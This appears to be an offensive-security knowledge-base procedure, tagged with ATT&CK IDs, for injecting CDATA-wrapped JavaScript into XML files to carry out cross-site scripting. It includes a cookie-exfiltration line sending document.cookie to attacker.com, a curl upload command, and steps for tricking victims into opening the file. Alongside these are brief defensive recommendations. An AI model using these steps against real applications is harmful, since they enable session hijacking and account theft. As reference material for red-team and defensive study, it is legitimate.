---
id: 6a815c3c-c816-4568-91d9-f7b58c7e3428
type: procedure
name: XML-Payload-Injection-for-XSS-in-Files
description: >-
  Injects malicious JavaScript into XML files using CDATA sections to bypass XML
  parsing restrictions and execute XSS in a victim's browser.
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.988807+00:00'
updated_at: '2023-04-10T20:21:55.139972+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
  - '[[techniques/Browser-Session-Hijacking|T1185 - Browser Session Hijacking]]'
sub_techniques: []
tags:
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/XSS-in-Files]]'
  - xss
  - xml-injection
commands:
  - '[[commands/curl-xml-payload-injection]]'
platforms:
  - Web
tools: []
validated: true
---

# XML-Payload-Injection-for-XSS-in-Files

## Summary

This procedure demonstrates how to inject malicious JavaScript payloads into XML files using CDATA sections to evade XML parsing filters, enabling cross-site scripting (XSS) execution when the file is opened in a victim's browser. It targets vulnerabilities in applications that process user-controlled XML input without proper sanitization, allowing attackers to steal session cookies or perform unauthorized actions.

## Description

XML payload injection for XSS exploits flaws in XML parsers that fail to sanitize or escape user input within XML structures. By wrapping malicious JavaScript in a CDATA section, the payload avoids entity encoding issues and XML validation errors, ensuring it is treated as literal text until rendered in a browser context. This technique is effective against web applications that upload, store, or display XML files, such as content management systems or API endpoints handling XML data. The attack scenario involves identifying an input field or file upload that inserts data into an XML document, crafting the payload, and tricking a victim into accessing the tainted file. Successful execution leads to arbitrary JavaScript running in the victim's session, potentially resulting in data theft or account compromise. Prerequisites include a vulnerable XML processing endpoint and social engineering to deliver the file.

## Requirements

1. Access to a web application or service that accepts and processes user-controlled XML input (e.g., file upload or API endpoint).
2. Knowledge of the target XML structure to identify injectable elements.
3. A victim user who will open or interact with the resulting XML file in a browser.
4. Tools for sending HTTP requests, such as curl or a proxy like Burp Suite.

## Defense

- Implement strict input validation and sanitization for XML inputs, stripping or escaping CDATA sections and script tags.
- Deploy Content Security Policy (CSP) headers to restrict inline script execution and external resource loading.
- Use a web application firewall (WAF) to detect and block XML payloads containing script tags or unusual CDATA content.
- Avoid rendering XML files directly in browsers; parse and sanitize server-side before display.

## Objectives

1. Identify and target a vulnerable XML input point in the application.
2. Inject a CDATA-wrapped JavaScript payload to execute XSS.
3. Achieve code execution in the victim's browser to steal sensitive data like session cookies.

## Instructions

### Step 1: Identify Vulnerable XML Input

**Context**: Locate an endpoint or form that accepts XML data without proper sanitization, such as a file upload feature or XML-based API. Test for injection points by submitting simple malformed XML and observing if it affects parsing or rendering.

Inspect the application's documentation or use developer tools to map the XML structure. Look for elements like <name> or <value> that accept user input.

### Step 2: Craft the Malicious XML Payload

**Context**: Create the payload using a CDATA section to encapsulate JavaScript, preventing XML parser interference. Customize the script to perform actions like alerting the domain or exfiltrating cookies.

Use the following code snippet for the payload: [[codes/XML-CDATA-Wrapped-JavaScript-XSS]].

Replace the inner script with desired malicious code, e.g., document.location='http://attacker.com?cookie='+document.cookie for exfiltration.

### Step 3: Inject the Payload via HTTP Request

**Context**: Submit the crafted XML to the target endpoint to taint the file or response. This step assumes a POST request to an upload or processing API.

**Command** ([[commands/curl-xml-payload-injection]]):
```bash
curl -X POST -H "Content-Type: application/xml" --data @payload.xml $_TARGET_URL
```

> This command uploads the XML file containing the payload. Expected output includes a success response (e.g., HTTP 200) confirming the file was processed or stored. Verify no parsing errors in the response body.

### Step 4: Deliver and Execute on Victim

**Context**: Trick the victim into opening the tainted XML file in their browser, such as via email attachment or shared link. The browser will parse the XML and execute the script if viewed directly (e.g., via XMLHttpRequest or as an XML document).

Monitor your attack server for callbacks from the executed script, such as cookie exfiltration.

### Step 5: Verify Execution and Collect Data

**Context**: Confirm XSS success by checking for the payload's effects, like a confirm dialog or data sent to your server.

Review browser console logs or network traffic for script execution indicators. If using a beacon payload, check incoming requests on your listener.
